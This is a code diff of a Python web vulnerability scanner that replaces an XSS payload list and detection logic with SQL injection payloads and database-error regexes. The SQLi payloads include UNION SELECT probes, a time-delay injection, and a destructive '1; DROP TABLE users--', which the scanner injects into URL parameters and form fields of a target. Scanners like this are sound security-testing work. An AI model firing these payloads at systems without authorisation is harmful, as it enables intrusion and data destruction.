@@ -6,32 +6,65 @@ from typing import List, Dict, Optional, Union
 
 logger = logging.getLogger(__name__)
 
-class XSSScanner:
+class SQLiScanner:
     def __init__(self, client=None):
         self.client = client if client else HttpClient()
         self.payloads = [
-            "<script>alert('XSS')</script>",
-            "<img src=x onerror=alert('XSS')>",
-            "<svg onload=alert('XSS')>",
-            "'><script>alert('XSS')</script>",
-            "\"><script>alert('XSS')</script>",
-            "javascript:alert('XSS')",
-            "onmouseover=alert('XSS')",
-            "onerror=alert('XSS')",
-            "<a href=javascript:alert('XSS')>XSS</a>",
-            "<body onload=alert('XSS')>"
+            "'",
+            "' OR '1'='1",
+            "' OR 1=1 --",
+            '" OR "" = "',
+            "') OR ('1'='1--",
+            "1; DROP TABLE users--",
+            "1' WAITFOR DELAY '0:0:10'--",
+            "1 OR 1=1",
+            "1' UNION SELECT NULL--",
+            "1' UNION SELECT NULL,NULL--",
+            "1' UNION SELECT NULL,NULL,NULL--",
+            "1' UNION SELECT NULL,NULL,NULL,NULL--",
+            "1' UNION SELECT NULL,NULL,NULL,NULL,NULL--"
         ]
-        self.encoding_patterns = [
-            r'&lt;script&gt;',
-            r'&lt;img',
-            r'&lt;svg',
-            r'&lt;a',
-            r'&lt;body',
-            r'&amp;lt;script&amp;gt;',
-            r'&amp;lt;img',
-            r'&amp;lt;svg',
-            r'&amp;lt;a',
-            r'&amp;lt;body'
+        self.error_patterns = [
+            r"SQL syntax",
+            r"MySQL server",
+            r"ORA-[0-9]+",
+            r"syntax error",
+            r"unclosed quotation",
+            r"JDBC exception",
+            r"SQLite/JDBCDriver",
+            r"SQLite.Exception",
+            r"System.Data.SQLite.SQLiteException",
+            r"Warning.*mysql_.*",
+            r"valid MySQL result",
+            r"MySqlClient\.",
+            r"PostgreSQL.*ERROR",
+            r"Warning.*\Wpg_.*",
+            r"valid PostgreSQL result",
+            r"Npgsql\.",
+            r"Microsoft SQL Native Client error",
+            r"OLE DB.*SQL Server",
+            r"SQL Server.*Driver",
+            r"Warning.*odbc_.*",
+            r"Warning.*mssql_",
+            r"Microsoft Access Driver",
+            r"JET Database Engine",
+            r"Access Database Engine",
+            r"Syntax error.*in query expression",
+            r"Unclosed quotation mark after the character string",
+            r"Microsoft OLE DB Provider for ODBC Drivers",
+            r"Microsoft OLE DB Provider for SQL Server",
+            r"SQL Server.*Driver.*Error",
+            r"SQL Server.*Driver.*Warning",
+            r"SQL Server.*Driver.*Exception",
+            r"SQL Server.*Driver.*Fatal",
+            r"SQL Server.*Driver.*Critical",
+            r"SQL Server.*Driver.*Severe",
+            r"SQL Server.*Driver.*Error.*[0-9]+",
+            r"SQL Server.*Driver.*Warning.*[0-9]+",
+            r"SQL Server.*Driver.*Exception.*[0-9]+",
+            r"SQL Server.*Driver.*Fatal.*[0-9]+",
+            r"SQL Server.*Driver.*Critical.*[0-9]+",
+            r"SQL Server.*Driver.*Severe.*[0-9]+"
         ]
 
     def scan(self, url: str, forms: Optional[List[Dict]] = None) -> List[Dict]:
@@ -49,18 +82,18 @@ class XSSScanner:
                             test_url = self._inject_payload(url, param, payload)
                             response = self.client.get(test_url, timeout=10)
                             
-                            if response and self._is_vulnerable(response.text, payload):
+                            if response and self._is_vulnerable(response.text):
                                 vulnerabilities.append({
-                                    'type': 'XSS',
+                                    'type': 'SQL Injection',
                                     'url': test_url,
                                     'payload': payload,
-                                    'evidence': self._get_evidence(response.text, payload),
-                                    'severity': 'high',
+                                    'evidence': self._extract_error(response.text),
+                                    'severity': 'critical',
                                     'param': param,
                                     'method': 'GET'
                                 })
                         except Exception as e:
-                            logger.error(f"XSS GET scan error for {url}: {str(e)}")
+                            logger.error(f"SQLi GET scan error for {url}: {str(e)}")
             
             # Check forms
             if forms:
@@ -93,23 +126,23 @@ class XSSScanner:
                                         logger.warning(f"Unsupported form method: {method}")
                                         continue
                                     
-                                    if response and self._is_vulnerable(response.text, payload):
+                                    if response and self._is_vulnerable(response.text):
                                         vulnerabilities.append({
-                                            'type': 'XSS',
+                                            'type': 'SQL Injection',
                                             'url': action,
                                             'payload': payload,
-                                            'evidence': self._get_evidence(response.text, payload),
-                                            'severity': 'high',
+                                            'evidence': self._extract_error(response.text),
+                                            'severity': 'critical',
                                             'param': field,
                                             'method': method
                                         })
                                 except Exception as e:
-                                    logger.error(f"XSS form scan error for field {field}: {str(e)}")
+                                    logger.error(f"SQLi form scan error for field {field}: {str(e)}")
                     except Exception as e:
-                        logger.error(f"XSS form scan error: {str(e)}")
+                        logger.error(f"SQLi form scan error: {str(e)}")
         
         except Exception as e:
-            logger.error(f"XSS scan error: {str(e)}")
+            logger.error(f"SQLi scan error: {str(e)}")
         
         return vulnerabilities
 
@@ -120,24 +153,12 @@ class XSSScanner:
         new_query = '&'.join(f"{k}={quote(v[0])}" for k, v in query.items())
         return f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
 
-    def _is_vulnerable(self, response_text: str, payload: str) -> bool:
-        # Check if payload appears in response without proper encoding
-        if payload in response_text:
-            return True
-            
-        # Check for encoded versions of the payload
-        for pattern in self.encoding_patterns:
-            if re.search(pattern, response_text, re.IGNORECASE):
-                return True
-                
-        return False
+    def _is_vulnerable(self, response_text: str) -> bool:
+        return any(re.search(pattern, response_text, re.IGNORECASE) for pattern in self.error_patterns)
 
-    def _get_evidence(self, response_text: str, payload: str) -> str:
-        if payload in response_text:
-            return "XSS payload found in response without encoding"
-            
-        for pattern in self.encoding_patterns:
-            if re.search(pattern, response_text, re.IGNORECASE):
-                return f"Encoded XSS payload found in response: {pattern}"
-                
-        return "XSS vulnerability detected through response analysis"
+    def _extract_error(self, text: str) -> str:
+        for pattern in self.error_patterns:
+            match = re.search(pattern, text, re.IGNORECASE)
+            if match:
+                return f"SQL error detected: {match.group(0)}"
+        return "Unknown SQL error"
